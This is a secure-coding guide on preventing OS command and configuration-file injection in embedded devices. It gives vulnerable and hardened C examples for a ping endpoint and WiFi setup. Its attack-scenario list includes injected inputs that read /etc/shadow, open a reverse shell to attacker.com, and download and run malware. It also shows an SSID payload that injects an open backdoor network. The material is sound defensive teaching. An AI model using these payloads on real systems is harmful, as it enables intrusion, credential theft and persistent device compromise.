# Injection Prevention

Ensure all untrusted data and user input is validated, sanitized, and/or output encoded to prevent unintended system execution. There are various injection attacks within application security such as operating system \(OS\) command injection, cross-site scripting \(E.g. JavaScript injection\), SQL injection, and others such as XPath injection. However, the most prevalent of the injection attacks within embedded software pertain to OS command injection; when an application accepts untrusted/insecure input and passes it to external applications \(either as the application name itself or arguments\) without validation or proper escaping.

[**Noncompliant Code Example**](https://wiki.sei.cmu.edu/confluence/display/c/2130132) of using operating system calls:

In this noncompliant code example, the system\(\) function is used to execute any\_cmd in the host environment. Invocation of a command processor is not required.

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

enum { BUFFERSIZE = 512 };

void func(const char *input) {
  char cmdbuf[BUFFERSIZE];
  int len_wanted = snprintf(cmdbuf, BUFFERSIZE,
                            "any_cmd '%s'", input);
  if (len_wanted >= BUFFERSIZE) {
    /* Handle error */
  } else if (len_wanted < 0) {
    /* Handle error */
  } else if (system(cmdbuf) == -1) {
    /* Handle error */
  }
}
```

If this code is compiled and run with elevated privileges on a Linux system, an attacker can create an account by entering the following string: `any_cmd ‘happy'; useradd 'attacker’` which would be interpreted as:

```c
any_cmd 'happy';
useradd 'attacker'
```

**Compliant Example**:In this compliant solution, the call to `system()` is replaced with a call to `execve()`. The exec family of functions does not use a full shell interpreter, so it is not vulnerable to command-injection attacks, such as the one illustrated in the noncompliant code example.

The `execlp()`, `execvp()`, and \(nonstandard\) `execvP()` functions duplicate the actions of the shell in searching for an executable file if the specified filename does not contain a forward slash character \(/\). As a result, they should be used without a forward slash character \(/\) only if the PATH environment variable is set to a safe value.

The `execl()`, `execle()`, `execv()`, and `execve()` functions do not perform path name substitution.

Additionally, precautions should be taken to ensure the external executable cannot be modified by an untrusted user, for example, by ensuring the executable is not writable by the user. This compliant solution is significantly different from the preceding noncompliant code example. First, input is incorporated into the args array and passed as an argument to `execve()`, eliminating concerns about buffer overflow or string truncation while forming the command string. Second, this compliant solution forks a new process before executing `/usr/bin/any_cmd` in the child process. Although this method is more complicated than calling system\(\), the added security is worth the additional effort.

```c
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

void func(char *input) {
  pid_t pid;
  int status;
  pid_t ret;
  char *const args[3] = {"any_exe", input, NULL};
  char **env;
  extern char **environ;

  /* ... Sanitize arguments ... */

  pid = fork();
  if (pid == -1) {
    /* Handle error */
  } else if (pid != 0) {
    while ((ret = waitpid(pid, &status, 0)) == -1) {
      if (errno != EINTR) {
        /* Handle error */
        break;
      }
    }
    if ((ret != -1) &&
      (!WIFEXITED(status) || !WEXITSTATUS(status)) ) {
      /* Report unexpected child status */
    }
  } else {
    /* ... Initialize env as a sanitized copy of environ ... */
    if (execve("/usr/bin/any_cmd", args, env) == -1) {
      /* Handle error */
      _Exit(127);
    }
  }
}
```

## Real-World Embedded Device Examples (2025)

### Example 1: OS Command Injection in Embedded Web Application

Many embedded devices expose web-based diagnostic tools that execute system commands. This example shows a common vulnerability in network diagnostic functions.

**Vulnerable Code - Network Diagnostics Endpoint**:

```c
// Embedded web server CGI handler - VULNERABLE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void handle_ping_request(const char *target_ip) {
    char command[256];

    // VULNERABLE: User input directly in system() call
    snprintf(command, sizeof(command), "ping -c 4 %s", target_ip);
    system(command);  // OS Command Injection vulnerability!
}

// Example vulnerable web request:
// GET /cgi-bin/ping?ip=192.168.1.1; cat /etc/shadow
// Executes: ping -c 4 192.168.1.1; cat /etc/shadow
```

**Attack Scenarios**:
* `192.168.1.1; reboot` - Reboot device remotely
* `192.168.1.1 && cat /etc/shadow` - Extract password hashes
* `192.168.1.1 | nc attacker.com 4444 -e /bin/sh` - Create reverse shell
* `192.168.1.1; wget http://malware.com/bot -O /tmp/bot && chmod +x /tmp/bot && /tmp/bot` - Download and execute malware

**Secure Solution**:

```c
// SECURE: Validate input and use execve() instead of system()
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <regex.h>
#include <ctype.h>

int validate_ipv4(const char *ip) {
    regex_t regex;
    // Strict IPv4 validation regex
    const char *pattern = "^([0-9]{1,3}\\.){3}[0-9]{1,3}$";

    if (regcomp(&regex, pattern, REG_EXTENDED) != 0) {
        return 0;
    }

    int result = regexec(&regex, ip, 0, NULL, 0);
    regfree(&regex);

    if (result != 0) return 0;

    // Additional validation: Check each octet is 0-255
    int a, b, c, d;
    if (sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) {
        return 0;
    }

    if (a < 0 || a > 255 || b < 0 || b > 255 ||
        c < 0 || c > 255 || d < 0 || d > 255) {
        return 0;
    }

    return 1;
}

int is_private_ip(const char *ip) {
    int a, b, c, d;
    sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);

    // Allow only private IP ranges (example policy)
    // 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12
    if ((a == 192 && b == 168) ||
        (a == 10) ||
        (a == 172 && b >= 16 && b <= 31)) {
        return 1;
    }

    return 0;
}

void handle_ping_request_secure(const char *target_ip) {
    // Step 1: Validate input format
    if (!validate_ipv4(target_ip)) {
        fprintf(stderr, "Invalid IP address format\n");
        return;
    }

    // Step 2: Apply allowlist policy (only private IPs)
    if (!is_private_ip(target_ip)) {
        fprintf(stderr, "IP not in allowed range\n");
        return;
    }

    // Step 3: Use execve() with controlled arguments
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - No shell interpretation
        char *args[] = {
            "/bin/ping",
            "-c", "4",
            "-W", "2",  // 2 second timeout
            (char *)target_ip,
            NULL
        };
        char *env[] = {NULL};  // Empty environment

        execve("/bin/ping", args, env);
        _Exit(127);  // exec failed
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("Ping successful\n");
        } else {
            printf("Ping failed\n");
        }
    } else {
        perror("fork failed");
    }
}
```

### Example 2: Newline Command Injection in Configuration Files

Configuration file injection is common in embedded devices that write user input to config files without proper sanitization.

**Vulnerable Code - WiFi Configuration**:

```c
// Embedded device WiFi configuration - VULNERABLE
#include <stdio.h>
#include <string.h>

void configure_wifi(const char *ssid, const char *password) {
    FILE *fp = fopen("/etc/wpa_supplicant/wpa_supplicant.conf", "w");
    if (!fp) return;

    // VULNERABLE: No newline validation
    fprintf(fp, "network={\n");
    fprintf(fp, "    ssid=\"%s\"\n", ssid);
    fprintf(fp, "    psk=\"%s\"\n", password);
    fprintf(fp, "}\n");

    fclose(fp);
    system("wpa_cli -i wlan0 reconfigure");
}

// Attack vector - malicious SSID:
// SSID = "MyNetwork\"\n}\nnetwork={\n    ssid=\"EvilBackdoor\"\n    key_mgmt=NONE\n#"
//
// Results in injected configuration:
// network={
//     ssid="MyNetwork"
// }
// network={
//     ssid="EvilBackdoor"
//     key_mgmt=NONE    # No authentication - open backdoor!
// #"
//     psk="userpassword"
// }
```

**Attack Impact**:
* Add backdoor WiFi networks without authentication
* Inject malicious configuration directives
* Disable security features via config injection
* Expose device to unauthorized access

**Secure Solution**:

```c
// SECURE: Validate and sanitize configuration input
#include <stdio.h>
#include <string.h>
#include <ctype.h>

int validate_wifi_ssid(const char *ssid) {
    size_t len = strlen(ssid);

    // Check length (WPA2 max SSID: 32 bytes)
    if (len == 0 || len > 32) return 0;

    // Check for control characters and injection chars
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)ssid[i];

        // Reject: newlines, carriage returns, nulls, quotes, backslashes
        if (c == '\n' || c == '\r' || c == '\0' ||
            c == '"' || c == '\'' || c == '\\' ||
            c == '}' || c == '{' || c == '#' || c == ';') {
            return 0;
        }

        // Only allow printable ASCII and common UTF-8
        if (c < 0x20 || c == 0x7F) {
            return 0;
        }
    }

    return 1;
}

int validate_wifi_password(const char *password) {
    size_t len = strlen(password);

    // WPA2 password: 8-63 characters
    if (len < 8 || len > 63) return 0;

    // Same character validation as SSID
    return validate_wifi_ssid(password);
}

void escape_for_config(const char *input, char *output, size_t output_size) {
    size_t j = 0;
    for (size_t i = 0; input[i] && j < output_size - 2; i++) {
        // Escape quotes and backslashes
        if (input[i] == '"' || input[i] == '\\') {
            output[j++] = '\\';
        }
        output[j++] = input[i];
    }
    output[j] = '\0';
}

void configure_wifi_secure(const char *ssid, const char *password) {
    char safe_ssid[128];
    char safe_password[128];

    // Step 1: Validate inputs
    if (!validate_wifi_ssid(ssid)) {
        fprintf(stderr, "Invalid SSID format\n");
        return;
    }

    if (!validate_wifi_password(password)) {
        fprintf(stderr, "Invalid password format\n");
        return;
    }

    // Step 2: Escape special characters (defense in depth)
    escape_for_config(ssid, safe_ssid, sizeof(safe_ssid));
    escape_for_config(password, safe_password, sizeof(safe_password));

    // Step 3: Use safe file writing with atomic operation
    const char *tmp_file = "/etc/wpa_supplicant/wpa_supplicant.conf.tmp";
    const char *conf_file = "/etc/wpa_supplicant/wpa_supplicant.conf";

    FILE *fp = fopen(tmp_file, "w");
    if (!fp) {
        perror("Failed to open config file");
        return;
    }

    // Step 4: Write validated and escaped configuration
    fprintf(fp, "# Generated configuration - do not edit\n");
    fprintf(fp, "network={\n");
    fprintf(fp, "    ssid=\"%s\"\n", safe_ssid);
    fprintf(fp, "    psk=\"%s\"\n", safe_password);
    fprintf(fp, "}\n");

    fclose(fp);

    // Step 5: Atomic rename (prevents partial writes)
    if (rename(tmp_file, conf_file) != 0) {
        perror("Failed to update config");
        unlink(tmp_file);
        return;
    }

    // Step 6: Use safe reconfiguration (no shell)
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {
            "/usr/sbin/wpa_cli",
            "-i", "wlan0",
            "reconfigure",
            NULL
        };
        execve("/usr/sbin/wpa_cli", args, NULL);
        _Exit(127);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
}
```

**Additional Defense Mechanisms**:

```c
// Helper: Strip all control characters
void sanitize_control_chars(char *str) {
    char *src = str;
    char *dst = str;

    while (*src) {
        // Keep only printable characters
        if (isprint((unsigned char)*src)) {
            *dst++ = *src;
        }
        src++;
    }
    *dst = '\0';
}

// Helper: Use parameterized config writers (like prepared statements for SQL)
typedef struct {
    const char *key;
    const char *value;
} config_param_t;

void write_config_safe(const char *filename, config_param_t *params, size_t count) {
    FILE *fp = fopen(filename, "w");
    if (!fp) return;

    for (size_t i = 0; i < count; i++) {
        // No user input in format string
        fputs(params[i].key, fp);
        fputs("=\"", fp);
        // Write value character by character, escaping as needed
        for (const char *p = params[i].value; *p; p++) {
            if (*p == '"' || *p == '\\') fputc('\\', fp);
            if (isprint((unsigned char)*p)) fputc(*p, fp);
        }
        fputs("\"\n", fp);
    }

    fclose(fp);
}
```

## OWASP IoT Ecosystem Mapping

### OS Command Injection (Example 1):
* **OWASP ISVS**: V2.3.1 - The device validates and sanitizes all untrusted data used in operating system command execution
* **OWASP ISTG**: ISTG-UI-INFO-001 - Test web interface input validation and command injection
* **OWASP FSTM**: Stage 6 (Dynamic Analysis) - Test network diagnostic functions for command injection
* **OWASP IoTGoat**: Practice with ping command injection vulnerability in web admin panel

### Configuration Injection (Example 2):
* **OWASP ISVS**: V2.3.2 - Configuration file parsers validate input to prevent injection attacks
* **OWASP ISTG**: ISTG-FW-CONF-001 - Configuration file security testing
* **OWASP FSTM**: Stage 4 (Filesystem Analysis) - Examine configuration file parsing logic
* **OWASP IoTGoat**: Practice with WiFi config injection in network settings page

**Considerations:**

* Do not invoke shell command wrappers such as but not limited to:
  * PHP:`system()` `exec()`, `passthru()`, `shell_exec()`
  * C:`system() popen()`, `exec()`, `execl()`, `execle()`, `execv()`, `execve()`
  * C++:`ShellExecute()`
  * Lua:`os.execute()`
  * Perl:`system()`, `exec()`
  * Python:`os.system()` `subprocess.call()`
* If possible, avoid utilizing user data into operation system commands.
  * If needed, utilize lookup maps of numbers-to-command-strings for user driven strings that may be passed to the operating system.
* Apply an "allowed list" of accepted commands via a lookup map to ensure only expected parameter values are processed.
* **Validate and sanitize ALL user input** before using in system commands or configuration files
* **Reject dangerous characters**: newlines (`\n`, `\r`), semicolons (`;`), pipes (`|`), ampersands (`&`), quotes (`"`, `'`), backslashes (`\`), braces (`{`, `}`), hash (`#`)
* **Use parameterized/safe APIs**: `execve()` instead of `system()`, prepared statements for databases
* **Apply defense in depth**: Input validation + output escaping + safe APIs + least privilege
* Ensure to contextually output encode characters user data \(e.g. HTML, JavaScript, CSS, etc.\)
  * HTML Entity Encoding
    * &lt; output encoded to:
      * ```text
        &lt;
        ```
    * &gt; output encoded to:
      * `&gt;`

## Additional References: <a id="additional-references"></a>

* [Multiple Netgear routers are vulnerable to arbitrary command injection](https://www.kb.cert.org/vuls/id/582384)
* [FTC Charges D-Link Put Consumers’ Privacy at Risk Due to the Inadequate Security of Its Computer Routers and Cameras](https://www.ftc.gov/news-events/press-releases/2017/01/ftc-charges-d-link-put-consumers-privacy-risk-due-inadequate)
* [https://www.owasp.org/index.php/XSS\_\(Cross\_Site\_Scripting\)\_Prevention\_Cheat\_Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
* [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [https://owasp.org/www-project-code-review-guide/](https://owasp.org/www-project-code-review-guide/) \(Page 117\)
* [https://owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)
* [http://cwe.mitre.org/data/definitions/77.html](http://cwe.mitre.org/data/definitions/77.html)
* [http://cwe.mitre.org/data/definitions/78.html](http://cwe.mitre.org/data/definitions/78.html)
* [Bash Command Injection Vulnerability](https://ics-cert.us-cert.gov/advisories/ICSA-14-269-01A)

